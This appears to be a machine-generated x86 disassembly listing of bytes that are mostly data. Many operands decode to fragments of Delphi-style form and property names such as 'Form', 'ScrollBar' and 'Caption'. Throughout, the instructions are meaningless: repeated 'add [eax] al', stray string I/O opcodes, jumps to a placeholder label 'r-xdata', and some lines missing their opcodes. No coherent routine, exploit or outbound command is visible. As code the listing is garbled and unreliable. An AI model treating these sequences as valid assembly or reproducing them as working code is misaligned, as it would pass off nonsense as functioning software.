jae r-xdata
jb r-xdata
outsd
scasd [ edi ]
inc esi
outsd
imul ecx [ ebx + esi * 2 - 0x5afeffbf ] 0x1d
inc ebx
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add ah bh
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
int 0xda
scasb [ edi ]
inc esi
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0xb4000000
inc esi
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add [ eax - 0x51 ] cl
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
push cs
jo r-xdata
mov eax eax
dec esp
mov al 0x46
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x80046af ] ch
jae r-xdata
push eax
outsd
jb r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cld
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
mov al 0x46
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add ah bh
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
or al 0x54
ror [ eax + esi * 4 + 0x46 ] 0x0
push es
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax - 0x50 ] ah
inc esi
add [ edx ] cl
jo r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
imul edi [ edx + 0x65 ] 0x796c6e4f
scasd [ edi ]
inc esi
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
clc
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
mov cl 0x46
inc eax
add ah ah
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ esi ] al
jo r-xdata
mov cl 0x46
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
inc ecx
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cwde
mov cl 0x46
add [ esi ] al
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
pushfd
mov cl 0x46
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
push esp
add [ ecx + 0xf030046 ] dh
je r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x4f ] dl
inc esi
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
in al 0xb1
inc esi
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax - 0x72ffb94f ] bl
inc eax
add [ eax ] ch
mov dl 0x46
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
add [ esi ] al
inc esi
jns r-xdata
jne r-xdata
popad
je r-xdata
mov cl 0x46
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
adc [ eax ] al
nop
insb
mov dl 0x46
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
jae r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x60046b1 ] bl
inc esi
outsd
jb r-xdata
add [ eax - 0x1e ] al
inc esi
add ah dh
jecxz r-xdata
fsubr [ esi + eax * 2 + 0x421a5c00 ]
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
dec esp
mov bl 0x46
add cl [ eax ]
push es
leave
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
mov esp 0x280046ec
rol [ ebp ] 0xd8
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add [ eax + 0x40046ed ] dh
jge r-xdata
add [ eax + 0x34 ] cl
inc eax
add [ eax + 0x8 ] ah
inc edi
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esp + 0x46 ] bl
add [ esi + ecx * 8 + 0x45 ] dl
add ah cl
jmp 0xffffffff941eb39c
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4c ] al
inc esi
add ah ah
mov ch 0x46
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x4cb3ffc0 ] cl
inc esi
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
adc [ eax + 0x6f ] esi
scasd [ edi ]
inc esi
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
cld
inc esi
outsd
jb r-xdata
insd
outsd
add [ eax ] al
push eax
jae r-xdata
add [ edx + ebx + 0x42 ] bl
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
mov al [ 0xffffffff80004705 ]
cwde
inc ebp
add [ eax + ebx * 4 + 0x81c0045 ] al
inc edi
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 + 0xf100045 ] dl
inc edi
add [ ebp + edx * 8 + 0x45 ] al
add [ eax + ebx * 2 ] bl
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax - 0x5bffbaa7 ] ch
out dx eax
inc esi
add [ eax - 0x12 ] dh
inc esi
add al ah
pop edx
inc ebp
add [ eax + esi * 8 ] bl
inc esi
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ edx - 0x4c ] ah
inc esi
add dl dl
mov ch 0x46
add al bh
add al [ eax ]
add ah bl
lodsb [ esi ]
inc esi
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
jae r-xdata
mov al 0x46
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
hlt
jb r-xdata
add al bl
mov edi 0x24240045
inc edi
add [ eax + 0x580046d9 ] ch
fadd [ esi ]
add al 0x15
inc edi
add [ eax - 0x1b ] al
inc esi
add [ ebp + 0x28040046 ] bh
inc edi
add [ eax - 0x1e ] bh
inc esi
add [ eax ] cl
and eax [ edi ]
call 0xffffffffbc46fb42
and al 0x47
add [ eax + 0xe0046ef ] ah
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
cmp al 0x2
add [ eax ] al
inc esp
scasd [ edi ]
inc esi
add [ eax + 0x2 ] dl
add [ eax ] al
js r-xdata
inc esi
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test al 0xb2
inc esi
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
outsb
je r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
mov cl 0x46
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_46b65a
inc ecx
add [ esi ] bl
inc esi
add [ eax - 0x1a ] bl
inc esi
add [ edi + 0x46 ] ah
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add ah bl
out dx eax
inc esi
add [ edi + edx + 0x42 ] dl
add [ ebx + ebp + 0x47 ] bh
add [ eax - 0x3697ffba ] dh
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
mov esp 0x280046ec
rol [ ebp ] 0xd8
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add [ eax + 0x40046ed ] dh
jge r-xdata
mov al [ 0xffffffff80004705 ]
cwde
inc ebp
add [ eax + ebx * 4 + 0x81c0045 ] al
inc edi
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 + 0xf100045 ] dl
inc edi
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0x24240045
inc edi
add [ eax + 0x580046d9 ] ch
fadd [ esi ]
add al 0x15
inc edi
add [ eax - 0x1b ] al
inc esi
add [ ebp + 0x28040046 ] bh
inc edi
add [ eax - 0x1e ] bh
inc esi
add [ eax ] cl
and eax [ edi ]
call 0xffffffffbc46fe46
and al 0x47
add [ eax + 0x50046ef ] ah
push esp
inc esi
outsd
jb r-xdata
add [ eax + ebx * 2 ] bl
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax - 0x5bffbaa7 ] ch
out dx eax
inc esi
add [ eax - 0x12 ] dh
inc esi
add al ah
pop edx
inc ebp
add [ eax + esi * 8 ] bl
inc esi
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ eax ] al
jmp [ eax + 0x4f ]
mov eax eax
push eax
mov bh 0x46
add [ edi ] al
add eax 0x726f4654
insd
push eax
mov dh 0x46
add al ah
mov ch 0x46
add [ esi ] bl
add eax 0x6d726f46
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
add al bh
jbe r-xdata
outsb
je r-xdata
add [ eax + eax ] bh
add dh bh
ror [ ebp + 0x45 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x63410600
je r-xdata
or [ ebp ] al
popad
add [ eax ] al
jmp [ eax + 0x3c00454d ]
outsd
insb
fadd [ eax ]
inc ebp
add [ ebx ] bl
add bh bh
pushad
dec edi
inc ebp
popad
inc edx
insb
outsb
insb
adc [ eax ] al
loope r-xdata
outsd
outsb
mov [ ebx ] ds
inc ebp
add [ eax ] ah
add al [ eax ]
inc esp
or [ edi ] al
inc esp
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410d000e ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
in al dx
sub al 0x47
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
outsd
or al 0x8
inc ebp
add [ ecx ] ah
add bh bh
mov al [ 0x3c00454d ]
dec esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4865646f
mov al 0x46
add [ eax ] ch
add al [ eax ]
dec [ eax + edi * 8 + 0x46 ]
add [ ebx + edi * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
dec esp
clc
inc esi
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
inc [ ebx + ebx * 8 ]
inc esi
add [ eax ] ch
in al dx
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
add al cl
out dx al
inc esi
add al dh
jmp r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
in al dx
pop ebx
inc ebp
add [ eax ] cl
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
cwde
out dx al
insb
test [ gs : esi ] dl
inc ebp
add [ ecx + eax ] ch
jmp [ eax + 0x10045c4 ]
call 0x1545b9ba
sub eax 0x10047
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
xchg esp eax
push esp
inc ebp
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
jpe r-xdata
scasb [ edi ]
inc esi
add [ ecx ] ch
add al [ eax ]
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
adc [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
inc esi
add al dh
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec esp
pop edx
inc ebp
add [ edx + ebx * 2 + 0x45 ] bh
add [ ebx + edi * 8 + 0x46 ] al
add [ eax ] al
outsd
jb r-xdata
test al 0x5e
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
rol ah 0x45
add ah ah
les eax [ ebp ]
outsb
je r-xdata
jmp r-xdata
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ eax + 0x54 ] dl
inc ebp
add [ eax - 0xfffb912 ] bl
jb r-xdata
add dh bh
jo r-xdata
jb r-xdata
mov al 0x46
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
and al 0xaf
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
pop esp
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
sub [ edx ] eax
in al dx
add al [ eax ]
inc [ eax ]
sub eax 0x10047
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
jae r-xdata
push es
inc ebp
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x14ff0001 ] ah
mov [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3f00ffff ] ah
les eax [ ebp ]
in al 0xc4
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push ebp
jae r-xdata
popad
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
mov ah 0x8
inc ebp
add [ eax + eax ] dh
jmp [ eax ]
sub_46bb17
push 0x457a
jns r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
jb r-xdata
push esp
imul esp [ gs : edi + 0x68 ] 0x4010e474
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
outsb
je r-xdata
jb r-xdata
cmp [ edx ] eax
inc eax
add al [ eax ]
dec ecx
imul ebp [ ebp - 0x54 ] 0x80046aa
add al [ eax ]
inc [ eax - 0x25 ]
inc esi
add [ ebx + edi * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
adc [ eax ] al
dec esp
add [ eax ] al
[ edx + edx * 2 ]
push esp
outsd
outsb
je r-xdata
push [ edx + eax ]
insb
inc esi
add [ eax + 0x2 ] ah
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
push ebx
arpl [ edx + 0x6f ] si
or [ esi + 0x6f ] eax
jb r-xdata
inc edx
add [ eax ] ch
add bh bh
inc eax
pop ebx
inc ebp
add [ eax + 0x5b ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
popad
je r-xdata
add bh bh
jo r-xdata
inc esi
add [ ebx + edi * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
insb
inc edx
popad
push ebx
je r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
add [ eax ] al
scasd [ edi ]
inc esi
add [ edi ] ch
add al [ eax ]
push [ ebx + edi * 8 + 0x46 ]
add [ ebx + edi * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
outsb
push eax
mov cl 0x46
outsb
arpl [ eax + 0x20 ] bp
dec edi
inc esi
add [ eax + eax ] bh
inc [ edx + ebx * 2 ]
inc ebp
add [ ebx + edi * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
jb r-xdata
js r-xdata
je r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
add [ ebx + edi * 8 + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
insb
jmp edx
jo r-xdata
add [ 0x35ff0002 ] dh
add al [ eax ]
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
insb
inc ebx
jb r-xdata
add [ eax + 0x4f0e002e ] al
dec esp
inc esi
add [ eax + 0x2 ] cl
add bh bh
mov esp 0x440046fc
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d04002d ] al
outsb
jne r-xdata
inc eax
add ah dh
inc [ esi ]
add bh bh
inc esi
add [ ebx + edi * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
outsb
jne r-xdata
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
push eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
add bh bh
add [ eax ] eax
adc [ eax ] al
xor al 0x2
add bh bh
xor al 0x2
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
add [ esi ] al
push ebx
arpl [ ecx + 0x6c ] sp
mov al 0x46
add [ eax ] dh
add al [ eax ]
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
adc [ eax ] al
nop
inc [ esi ]
movsb [ edi ] [ esi ]
inc [ esi ]
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
[ ebx + ebx * 2 + 0x5b640045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080037 ] al
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
clc
out dx al
inc esi
add al cl
jpe r-xdata
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
adc [ eax ] al
dec eax
add [ eax ] al
dec [ eax ]
push edx
inc ebp
add [ eax ] al
in al dx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
add [ eax ] al
inc eax
add [ eax ] al
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
je r-xdata
sub eax [ edx ]
add bh bh
[ esi ]
inc esp
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
or dl [ ebx + 0x63 ]
jb r-xdata
stosb [ edi ]
inc esi
add [ edx + eax ] cl
add bh bh
push eax
fild [ esi ]
inc esp
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
inc esp
sti
inc esi
jb r-xdata
push ecx
outsb
inc ebx
dec edi
insb
inc edi
inc esi
jb r-xdata
or [ eax + eax ] 0xd
push esi
add [ eax + 0x2 ] bl
add bh bh
xchg esp eax
cld
inc esi
add [ ebx + edi * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
or al 0xf
inc ebp
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
